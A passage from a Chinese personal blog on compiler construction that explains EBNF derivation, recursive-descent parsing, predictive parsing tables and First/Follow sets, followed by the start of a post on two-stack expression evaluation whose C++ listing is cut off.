<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">0((0))</span><br><span class="line">1((1))</span><br><span class="line">2((2))</span><br><span class="line">3((3))</span><br><span class="line">Language ----&gt;0--Expression--&gt;1--&quot;;&quot;--&gt;2--Language--&gt;3</span><br><span class="line">0--ε--&gt;3</span><br><span class="line">style 3 fill:red</span><br></pre></td></tr></table></figure>
<p>推导式中的所有符号,比如Language,Expression等,都作为有向图上的边,代表状态转移.状态作为节点</p>
<p>显然目前建立的所有有向图都是没有圈的,因为目前的文法定义已经消除了所有直接或者间接的左递归,表现到图上就是没有强连通分量</p>
<p>又如对于Expression和Expression'</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">4((4))</span><br><span class="line">5((5))</span><br><span class="line">6((6))</span><br><span class="line">Expression--&gt;4--Term--&gt;5--&quot;Expression&#x27;&quot;--&gt;6</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">7((7))</span><br><span class="line">8((8))</span><br><span class="line">9((9))</span><br><span class="line">10((10))</span><br><span class="line">Expression&#x27;--&gt;7--+--&gt;8--Term--&gt;9--Expression&#x27;--&gt;10</span><br><span class="line">7--ε--&gt;10</span><br></pre></td></tr></table></figure>
<p>下面就是化简状态转移图,怎么化简?</p>
<p>对于Expression',有一个规则1:</p>
<p>标记为A的边可等价为标记ε的边转向A转换图的初态；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">7((7))</span><br><span class="line">8((8))</span><br><span class="line">9((9))</span><br><span class="line">10((10))</span><br><span class="line">7--ε--&gt;10</span><br><span class="line">Expression&#x27;--&gt;7--+--&gt;8--Term--&gt;9</span><br><span class="line">9--ε--&gt;7</span><br><span class="line">style 10 fill:red</span><br></pre></td></tr></table></figure>
<p>然后紧接着可以应用规则2:</p>
<p>ε两头的节点可以合并,也就是说,epsilon闭包中的节点算成一个点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">7((7))</span><br><span class="line">8((8))</span><br><span class="line"></span><br><span class="line">Expression&#x27;--&gt;7--+--&gt;8--Term--&gt;7</span><br><span class="line"></span><br><span class="line">style 7 fill:red</span><br></pre></td></tr></table></figure>
<p>然后紧接着可以应用规则3:</p>
<p>标记相同的路径可以合并</p>
<p>啥意思呢?Expression'现在可以带入到Expression中了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">4((4))</span><br><span class="line"></span><br><span class="line">7((7))</span><br><span class="line">8((8))</span><br><span class="line"></span><br><span class="line">7--+--&gt;8--Term--&gt;7</span><br><span class="line">Expression--&gt;4--Term--&gt;7</span><br><span class="line">style 7 fill:red</span><br></pre></td></tr></table></figure>
<p>还有一条规则可以继续化简:</p>
<p>不可区分的状态可以合并</p>
<p>这里4状态和8状态都是经过Term转移到7,不可区分,因此有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">4((4))</span><br><span class="line"></span><br><span class="line">7((7))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7--+--&gt;4</span><br><span class="line">Expression--&gt;4--Term--&gt;7</span><br><span class="line">style 7 fill:red</span><br></pre></td></tr></table></figure>
<p>此时Expression'已经被扬了,Expression也是不能再简了,这就是最简结构了.根据这个结构,终于一眼丁真了
<span class="math display">\[
Expression\rightarrow Term\{+Term\}
\]</span></p>
<blockquote>
<p>这里只考虑了加法,减法和加法同级,也容易扩充 <span
class="math display">\[
Expression\rightarrow Term\{(+|-)Term\}
\]</span></p>
</blockquote>
<p>以此类推,可以得到所有符号的EBNF文法 <span class="math display">\[
\begin{aligned}
Language&amp;\rightarrow \{Expression;\}\\
Expression&amp;\rightarrow Term\{(+|-)Term\}\\
Term&amp;\rightarrow Factor\{(\times |/)Factor\}\\
Factor&amp;\rightarrow (Expression)|id|num
\end{aligned}
\]</span> 得到该EBNF表示的文法之后,已经可以动手写程序了.</p>
<h3 id="硬编码的代码实现">硬编码的代码实现</h3>
<h4 id="表达式求值">表达式求值</h4>
<p>贴出来又臭又长,不如放到pasbin了<a
target="_blank" rel="noopener" href="https://pastebin.com/4KPSsPBb">递归下降求解表达式 -
Pastebin.com</a></p>
<h4 id="表达式建立语法树">表达式建立语法树</h4>
<p>源代码中有反引号,并且博客渲染的时候代码块会匹配最近的反引号,<del>这应该是语法分析的错误罢</del></p>
<p>发生代码块反引号匹配错误,只能放到pastbin里了<a
target="_blank" rel="noopener" href="https://pastebin.com/xJuqQx3E">表达式树 - Pastebin.com</a></p>
<p>将树的结构按照mermaid语法规则输出到tree.md文件,然后用typora打开就可以实现可视化</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221103222106328.png"
alt="visiable" />
<figcaption aria-hidden="true">visiable</figcaption>
</figure>
<h2 id="预测分析">预测分析</h2>
<h3 id="为啥还需要预测分析">为啥还需要预测分析?</h3>
<p>上面我们已经写出代码了,表达式的语法分析可以说已经竣工了,但是为啥本章后面教材还是不依不饶地给了60页?</p>
<p>感觉教材也没有给预测分析器做一个铺垫,直接就抛出了这么一个概念干说.</p>
<p>我觉得,这是因为从EBNF构建语法分析器有很大的局限性,类比一下</p>
<p>根据EBNF写语法分析器,就类似于词法分析器用硬编码的DFA</p>
<p>为什么这样说呢?或者说根据EBNF写代码有啥缺点呢?</p>
<p>首先,EBNF中规定了死了,基本算数运算只有三种优先级,这对应到代码中的三个函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evalExpression</span><br><span class="line">evalTerm</span><br><span class="line">evalFactor</span><br></pre></td></tr></table></figure>
<p>试想,如果写完程序之后,又想加入新的优先级,比如规定乘方运算的优先级高于乘除低于括号.</p>
<p>又如方括号优先级低于小括号但是高于其他表达式.</p>
<p>这就意味着程序需要大改,新加入<code>evalPower</code>来处理乘方运算,并且函数的调用关系都得改</p>
<p>这就是从EBNF直接写代码的局限性,也就是说可拓展性差</p>
<p>怎么解决呢?还是回顾词法分析中的做法</p>
<blockquote>
<p>当时我们也是嫌硬编码的DFA不灵活,于是使用了表驱动或者有向图驱动的DFA.</p>
<p>DFA对外提供三个接口,都屏蔽了自身实现的差异.</p>
<p>表驱动的DFA想要拓展只需要新增表记录就可以了</p>
</blockquote>
<p>这就是<strong>预测分析器</strong>的<strong>预测分析表</strong>将要干的事情</p>
<h3 id="预测分析器">预测分析器</h3>
<h4 id="类比词法分析">类比词法分析</h4>
<p>前面我们已经给预测分析器做好铺垫了</p>
<p>预测分析器是词法分析器的一种实现方式,是下推自动机的一种实现</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221105150413813.png"
alt="预测分析器是下推自动机的实例" />
<figcaption aria-hidden="true">预测分析器是下推自动机的实例</figcaption>
</figure>
<blockquote>
<p>ip指向当前输入</p>
</blockquote>
<p>这个预测分析器和使用表驱动DFA的词法分析器有一定的相似之处,可以类比理解一下</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221105150714522.png"
alt="左表驱动DFA词法分析,右预测分析语法分析" />
<figcaption
aria-hidden="true">左表驱动DFA词法分析,右预测分析语法分析</figcaption>
</figure>
<p>词法分析器上的状态转移,只需要看一下输入序列,然后去分析表查一下下一个状态就可以了</p>
<p>相比于词法分析器,语法分析器多一个符号栈,也就是说预测分析器上的状态转移,不仅要考虑当前记号流中的记号,还要考虑当前符号栈的状态</p>
<h4 id="没有递归">没有递归?</h4>
<p>同时,从这个类比中,我们也可以隐约发现,<strong>预测分析器是没有递归的</strong></p>
<p>之前根据EBNF写的代码,递归很明显,<code>evalExpression-&gt;evalTerm-&gt;evalFactor</code></p>
<p>而现在只需要从预测分析表上进行状态转移.消除了递归</p>
<p>这意味着,现在可以将递归的方法,从表达式推广到绘图语言,写"编译原理的实验二--语法分析器"了,</p>
<p>实际上WXQ老师给出了2019C++实现版也就是基于递归下降方法实现的</p>
<h4 id="预测分析表是干啥的">预测分析表是干啥的?</h4>
<p>首先考虑这么一个表达式<span class="math inline">\(id+id\times
id\)</span>,如果使用前面定义的文法进行匹配,手工做的话应该如何</p>
<p><span class="math display">\[
\begin{aligned}
Language&amp;\rightarrow Expression;Language|\epsilon\\
Expression&amp;\rightarrow Term\ Expression&#39;\\
Expression&#39;&amp;\rightarrow +Term\ Expression&#39;|\epsilon\\
Term&amp;\rightarrow Factor \ Term&#39;\\
Term&#39;&amp;\rightarrow \times Factor\ Term&#39;|\epsilon\\
Factor&amp;\rightarrow (Expression)|-Factor|id
\end{aligned}
\]</span></p>
<p><span class="math display">\[
\begin{aligned}
L&amp;\rightarrow E\\
&amp;\rightarrow TE&#39;\\
&amp;\rightarrow FT&#39;E&#39;\\
&amp;\rightarrow idT&#39;E&#39;\\
&amp;\rightarrow idE&#39;\\
&amp;\rightarrow id+TE&#39;\\
&amp;\rightarrow id+FT&#39;E&#39;\\
&amp;\rightarrow id+idT&#39;E&#39;\\
&amp;\rightarrow id+id\times FT&#39;E&#39;\\
&amp;\rightarrow id+id\times idT&#39;E&#39;\\
&amp;\rightarrow id+id\times id
\end{aligned}
\]</span></p>
<p>我们这样做的依据就是文法规则中定义好的推导方式</p>
<p>预测分析表就干了我们脑子干的事情----匹配使用哪个推导规则</p>
<p>先给出这么一个状态转移表,简单地用它分析一下id+id*id,<strong>后来再关心这个表是怎么建立的</strong></p>
<h6 id="image-20221109212543264"><img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221109212543264.png"
alt="image-20221109212543264" /></h6>
<p>比如当前栈顶是L,输入符号是id,那么就应该首先L弹栈,然后把符号E压栈,转移到下一个<strong>格局</strong></p>
<p>当前栈顶是E,输入符号id,就应该首先E弹栈,然后把TE'压栈,转移到下一个格局</p>
<p>当前栈顶是T,输入id,就应该首先T弹栈,然后FT'压栈,转移到下一个格局</p>
<p>当前栈顶是F,输入id,就应该首先F弹栈,然后id压栈,转移到下一个格局</p>
<p>当前栈顶是id,输入id,匹配成功,都退栈</p>
<p>整个过程中"输入id"一直没变,也就是说指向输入串的指针始终没有移动</p>
<p>这里有一个新名词"格局",实际上类似于状态,它受到当前栈顶,当前输入,预测分析表三者的影响</p>
<blockquote>
<p>实际上就是迪杰斯特拉双栈算法求解算数表达式的算法思想</p>
<p>不断压栈直到栈顶和当前符号匹配实际上维护了一个单调栈,越靠近栈顶的符号优先级越高</p>
</blockquote>
<h4 id="如何定义格局">如何定义格局?</h4>
<p>表驱动的词法分析器中定义了一个状态,然后根据当前输入和状态转移表这里两个因素,从当前状态转移到下一个状态</p>
<p>对于预测分析表驱动的语法分析器,定义了一个类似状态的东西叫做"格局",</p>
<p>区别于状态转移,格局转换时需要考虑当前栈顶,预测分析表,当前输入符号,共3个因素</p>
<p>实际上格局变化是状态转移的推广</p>
<p>状态转移时维护一个栈当摆设就成了格局变化</p>
<h4 id="格局如何转移">格局如何转移?</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">设置ip使它指向w的第一个符号，其中ip 是输入指针；</span><br><span class="line">令X=栈顶符号；</span><br><span class="line"><span class="keyword">while</span>  ( X ≠ ＄ )｛     /   *      栈非空 */ </span><br><span class="line">            <span class="keyword">if</span> ( X 等于ip所指向的符号a) 执行栈的弹出操作，将ip向前移动一个位置；</span><br><span class="line">            <span class="keyword">else</span>  <span class="keyword">if</span> ( X是一个终结符号)  error ( ) ;</span><br><span class="line">            <span class="keyword">else</span>  <span class="keyword">if</span> ( M[X，a]是一个报错条目)  error ( ) ;           </span><br><span class="line">            <span class="keyword">else</span>  <span class="keyword">if</span> ( M[X，a] = X →Y1Y2 … Yk  )｛ </span><br><span class="line">                         输出产生式 X →Y1Y2 … Yk  ；</span><br><span class="line">                         弹出栈顶符号；</span><br><span class="line">                        将Yk，Yk<span class="number">-1</span> …，Yi 压入栈中，其中Y1位于栈顶。</span><br><span class="line">            &#125;</span><br><span class="line">            令X=栈顶符号</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里面M[X,a]就是当前栈顶为X,当前符号为a时查表能够转移到的下一个格局</p>
<p>匹配id+id*id的整个过程如图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221109215743134.png"
alt="image-20221109215743134" />
<figcaption aria-hidden="true">image-20221109215743134</figcaption>
</figure>
<p>语法分析阶段不管是递归下降还是预测分析,其目的相同</p>
<p>1.首先检查有没有语法错误.</p>
<p>2.给出抽象语法树.</p>
<p>递归下降法自顶向下建立抽象语法树是自然而然的</p>
<p>预测分析法怎么建立抽象语法树呢?</p>
<p>一时间竟想不到</p>
<p>蚌埠住了</p>
<h4 id="如何建立预测分析表">如何建立预测分析表?</h4>
<p>预测分析器算法和文法定义没有关系,文法定义体现在预测分析表上</p>
<p>预测分析器的算法是写死的,但是预测分析表是活的</p>
<h5 id="first集合">First集合</h5>
<p><span class="math inline">\(First(\alpha)=\{a|\alpha\Rightarrow
a,a\in T\}\)</span>也就是<span
class="math inline">\(\alpha\)</span>可以推导出的一个非终结字符的集合,如果<span
class="math inline">\(\alpha\Rightarrow \epsilon\)</span>,则<span
class="math inline">\(\epsilon \in First(\alpha)\)</span></p>
<p><span class="math inline">\(First(E)=\{(,id,num\}\)</span></p>
<h5 id="follow集合">Follow集合</h5>
<p><span class="math display">\[
Follow(A)=\{a|S\Rightarrow ...Aa...,a\in T\}
\]</span></p>
<p>紧跟在非终结符A后面的终结符集合</p>
<p><span class="math inline">\(Follow(E)=\{;,)\}\)</span></p>
<h5 id="算法求解first集合">算法求解First集合</h5>
<p><span class="math display">\[
X\rightarrow \alpha_1|\alpha_2|...|\alpha_m,m\ge1\\First(X)=\cup
First(\alpha_i)
\]</span></p>
<p>非终结符的First集合,等于其所有推导的First集合的并集</p>
<p>对于<span class="math inline">\(First(\alpha_i)\)</span>的求法:</p>
<p>其中如果<span
class="math inline">\(\alpha_i=\epsilon\)</span>,则<span
class="math inline">\(\epsilon\in First(\alpha_i)\)</span></p>
<p>否则,假设<span class="math inline">\(\alpha_i\Rightarrow
Y_1,Y_2,...,Y_n\)</span></p>
<p>如果<span class="math inline">\(Y1\)</span>可以推导出<span
class="math inline">\(\epsilon\)</span>,则Y2就有可能成为最前面的,那么就得考虑<span
class="math inline">\(First(Y_2)\)</span></p>
<p>如果<span class="math inline">\(Y_1\)</span>推导不出<span
class="math inline">\(\epsilon\)</span>,则Y2就肯定不可能成为最前面,因此不用考虑<span
class="math inline">\(First(Y_2)\)</span> <span class="math display">\[
First(\alpha_i)=\cup _{j=1}^k (First(Y_j)-\epsilon)
\]</span></p>
<p>当<span class="math inline">\(Y_k\)</span>推导不出<span
class="math inline">\(\epsilon\)</span>时,才会停止j往后遍历</p>
<h5 id="求解follow集合">求解Follow集合</h5>
<h3 id="算数表达式的预测分析语法分析">算数表达式的预测分析语法分析</h3>
<p><span class="math display">\[
\begin{aligned}
Language&amp;\rightarrow Expression;Language|\epsilon\\
Expression&amp;\rightarrow Term\ Expression&#39;\\
Expression&#39;&amp;\rightarrow +Term\ Expression&#39;|\epsilon\\
Term&amp;\rightarrow Factor \ Term&#39;\\
Term&#39;&amp;\rightarrow \times Factor\ Term&#39;|\epsilon\\
Factor&amp;\rightarrow (Expression)|-Factor|id
\end{aligned}
\]</span></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/10/17/%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">词法分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-17 11:09:00" itemprop="dateCreated datePublished" datetime="2022-10-17T11:09:00+08:00">2022-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-15 10:12:52" itemprop="dateModified" datetime="2022-11-15T10:12:52+08:00">2022-11-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="词法分析器">词法分析器</h1>
<h2 id="词法分析先修-表达式求值">词法分析先修-表达式求值</h2>
<p>求一个包含加减乘除乘方括号的表达式值,要求考虑运算优先级</p>
<p>比如<code>1+2*3-(4+5)*6</code></p>
<h3 id="迪杰斯特拉双栈法">迪杰斯特拉双栈法</h3>
<p>双栈,一个用于存放操作数<code>stack&lt;double&gt; operands</code>,一个用于存放运算符<code>stack&lt;char&gt; operaotors</code></p>
<p>运算优先级通过给每个运算符定义栈内外优先级来体现:</p>
<p>教材给出的优先级定义是:</p>
<p>icp,栈外优先级</p>
<p>isp,栈内优先级</p>
<table>
<thead>
<tr>
<th>优先级</th>
<th>(</th>
<th>+-</th>
<th>*/</th>
<th>)</th>
</tr>
</thead>
<tbody>
<tr>
<td>栈内优先级isp</td>
<td>1</td>
<td>3</td>
<td>5</td>
<td>8</td>
</tr>
<tr>
<td>栈外优先级icp</td>
<td>8</td>
<td>2</td>
<td>4</td>
<td>1</td>
</tr>
</tbody>
</table>
<h4 id="双栈算法">双栈算法</h4>
<p>对于一个操作数,直接压入operands栈</p>
<p>对于一个运算符c,</p>
<p>1.如果其栈外优先级比符号栈栈顶运算符的栈内优先级要高,则c入符号栈,即</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(operators.empty()||icp(c)&gt;isp(operators.top()))&#123;</span><br><span class="line">    operators.push(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.如果其栈外优先级比符号栈栈顶优先级低,则首先要符号栈弹栈,每次弹出一个符号,顺带弹出两个操作数栈的数,根据该符号对这两个操作数进行运算之后将运算结果重新压入操作数栈.如此直到符号栈顶的栈内优先级小于c的栈外优先级时,c压栈</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!operators.empty()&amp;&amp;icp(c)&lt;isp(operators.top()))&#123;</span><br><span class="line">	<span class="keyword">while</span>(!operators.empty()&amp;&amp;icp(c)&lt;isp(operators.top()))&#123;</span><br><span class="line">        op=operators.top();</span><br><span class="line">        operators.pop();</span><br><span class="line">		<span class="keyword">if</span>(operands.size()&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">			first=operands.top();</span><br><span class="line">			operands.pop();</span><br><span class="line">			second=operands.top();</span><br><span class="line">			operands.pop();</span><br><span class="line">            operands.push(basic_operate(op,first,second));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> error</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span>(operators.empty()||icp(c)&gt;isp(operators.top()))&#123;</span><br><span class="line">        operators.push(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//icp(c)==isp(operators.top())的情况,见3</span></span><br><span class="line">        operators.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.如果符号栈顶的栈内优先级等于c的栈外优先级,直接符号栈退栈一个,c也一并扔掉.</p>
<p>如果2中发生了符号栈退栈到某时,符号栈顶的栈内优先级等于c的栈外优先级,也是将栈顶和c都扬了</p>
<p>这是因为遇到了括号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(icp(c)==isp(operators.top()))&#123;</span><br><span class="line">	operators.pop()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="完整代码">完整代码</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// string expression;</span></span><br><span class="line"><span class="comment">// int pos;</span></span><br><span class="line"><span class="type">int</span> Invalid;<span class="comment">//失效标志</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">icp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//栈外优先级</span></span><br><span class="line">    <span class="type">int</span> priority=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            priority=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            priority=<span class="number">4</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            priority=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            priority=<span class="number">8</span>;</span><br><span class="line">    